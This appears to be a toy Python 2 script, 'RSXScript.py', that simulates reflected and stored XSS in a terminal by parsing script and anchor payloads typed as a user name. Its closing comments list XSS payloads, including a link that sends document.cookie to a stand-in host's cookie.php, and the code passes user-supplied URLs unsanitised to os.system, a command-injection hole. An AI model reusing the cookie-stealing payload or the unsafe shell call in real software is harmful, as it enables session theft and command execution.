import os
import time
i=10
class col():
    RED='\033[0;31m'
    GBB='\033[1;32m'
    GBBb='\033[42m'
    REDb='\033[41m'
    YLL='\033[93m'
    BLL='\033[96m'
    BL='\033[34m'
    EN='\033[0m'
    GYY='\033[37m'
    PLL='\033[35m'
    LBB='\033[96m'
    CRR='\033[46m'
    GGG='\033[92m'
    RRR='\033[91m'
    BBB='\033[94m'
    GRY='\033[90m'
    LLL='\033[95m'
    CCC='\033[95m'
def clr():
   os.system('clear')
clr()
while i >= 0 :
  def wait(sec):
    time.sleep(sec)
  print col.YLL+"                   ======== Type 'exit()' To Exit ========"+col.EN
  print col.RED+'::'*40+col.EN
  put = raw_input('Enter User Name: ') 
  if put == 'exit()':
    exit()
  clr()
  try:
    put = put.split("<script>alert('")[1].split("')</script>")[0]
    print col.YLL+"                   ======== Type 'exit()' To Exit ========"+col.EN
    print '::'*40
    print col.CCC+'Welcome '+col.EN+put
  except:
    try:
       name = put.split('<a href=')[1].split('>')[1].split('</a')[0] # click
       web = put.split("<a href='")[1].split("'>")[0]
       print col.YLL+"                   ======== Type 'exit()' To Exit ========"+col.EN
       print '::'*40
       print col.CCC+'Welcome '+col.EN+name
       wait(1)
       print '  '+web
       web = "firefox "+web
       wait(4)
       os.system(web)
       print col.RED+'/ ! \ :Warning: '+col.EN+col.GYY+'Malicious code'+col.EN
    except:
       print '::'*40
       print col.CCC+'Welcome '+col.EN+put  
       clr()
       try:
          put = put.split("<script>document.write('")[1].split("')</script>")[0]
          print "======== Type 'exit()' To Exit ========"
          print '::'*40
          print 'Welcome '+put
       except:
          try:
              name = put.split('<a href=')[1].split('>')[1].split('</a')[0] # click
              web = put.split("<a href='")[1].split("'>")[0]
              print "======== Type 'exit()' To Exit ========"
              print '::'*40
              print 'Welcome '+name
              wait(1)
              print '  '+web
              web = "firefox "+web
              wait(4)
              os.system(web)
              print '/ ! \ :Warning: Malicious code'
          except:
             print '::'*40
             print col.CCC+'Welcome '+col.EN+put  

# RSXScript.py
# Reflected Xss And Stored Xss in Python
# <script>alert('reflected xss')</script>

# <a href='http://www.website.com/cookie.php?coo='+document.cookie()'>Stored Xss</a>


# <script>document.write('xss')</script>
